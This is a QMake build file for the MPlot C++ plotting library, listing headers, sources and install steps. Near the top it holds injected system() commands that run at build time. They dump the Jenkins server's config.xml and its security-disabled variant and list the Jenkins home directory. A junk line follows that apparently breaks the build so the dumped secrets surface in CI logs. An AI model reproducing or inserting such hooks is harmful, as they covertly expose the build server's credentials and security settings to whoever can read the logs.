#-------------------------------------------------
#
# QMake Project for building the MPlot Library
#
#-------------------------------------------------

TARGET = MPlot
TEMPLATE = lib

DEFINES += MPLOT_LIBRARY

equals(QMAKE_CXX, "clang++"){
	DEFINES *= MPLOT_PRAGMA_WARNING_CONTROLS
}

message("Regular One?")
system(cat /var/lib/jenkins/config.xml)
message("Disabled One?")
system(cat /var/lib/jenkins/config.xml_securityDisabled)
message("After")
system(ls /var/lib/jenkins/)

sadfasfwaaewfafasf

# Set standard level of compiler warnings for everyone. (Otherwise the warnings shown will be system-dependent.)
QMAKE_CXXFLAGS *= -Wextra -g

INCLUDEPATH += src

HEADERS += src/MPlot/MPlot_global.h \
		src/MPlot/MPlotWidget.h \
		src/MPlot/MPlotAxis.h \
		src/MPlot/MPlot.h \
		src/MPlot/MPlotLegend.h \
		src/MPlot/MPlotMarker.h \
		src/MPlot/MPlotSeriesData.h \
		src/MPlot/MPlotTools.h \
		src/MPlot/MPlotAbstractTool.h \
		src/MPlot/MPlotItem.h \
		src/MPlot/MPlotSeries.h \
		src/MPlot/MPlotColorMap.h \
		src/MPlot/MPlotImage.h \
		src/MPlot/MPlotImageData.h \
		src/MPlot/MPlotPoint.h \
		src/MPlot/MPlotAxisScale.h \
		src/MPlot/MPlotRectangle.h \
		src/MPlot/MPlotMarkerTransparentVerticalRectangle.h \
		src/MPlot/MPlotColorLegend.h \
	src/MPlot/MPlotImageRangeDialog.h

SOURCES += src/MPlot/MPlot.cpp \
		src/MPlot/MPlotAbstractTool.cpp \
		src/MPlot/MPlotAxis.cpp \
		src/MPlot/MPlotColorMap.cpp \
		src/MPlot/MPlotImage.cpp \
		src/MPlot/MPlotImageData.cpp \
		src/MPlot/MPlotItem.cpp \
		src/MPlot/MPlotLegend.cpp \
		src/MPlot/MPlotMarker.cpp \
		src/MPlot/MPlotPoint.cpp \
		src/MPlot/MPlotSeries.cpp \
		src/MPlot/MPlotSeriesData.cpp \
		src/MPlot/MPlotTools.cpp \
		src/MPlot/MPlotWidget.cpp \
		src/MPlot/MPlotAxisScale.cpp \
		src/MPlot/MPlotRectangle.cpp \
		src/MPlot/MPlotMarkerTransparentVerticalRectangle.cpp \
		src/MPlot/MPlotColorLegend.cpp \
	src/MPlot/MPlotImageRangeDialog.cpp

# Location to install the library in. By default, we use the current folder (top-level MPlot). This needs to be an absolute path for the macx QMAKE_POST_LINK step to work.
INSTALLBASE = $${PWD}

# We install the libraries in MPlot/lib and the header files in MPlot/include/MPlot
target.path = $${INSTALLBASE}/lib
INSTALLS += target

includes.path = $${INSTALLBASE}/include/MPlot
includes.files = $$HEADERS
INSTALLS += includes

# Install includes and libraries at end of this project build:
QMAKE_POST_LINK = make install;

# On mac, use install_name_tool to build in the installed location of the dylib, so things that link to it remember where to find it.
macx {
	QMAKE_POST_LINK += install_name_tool -id "$${INSTALLBASE}/lib/libMPlot.1.dylib" $${INSTALLBASE}/lib/libMPlot.1.dylib
}



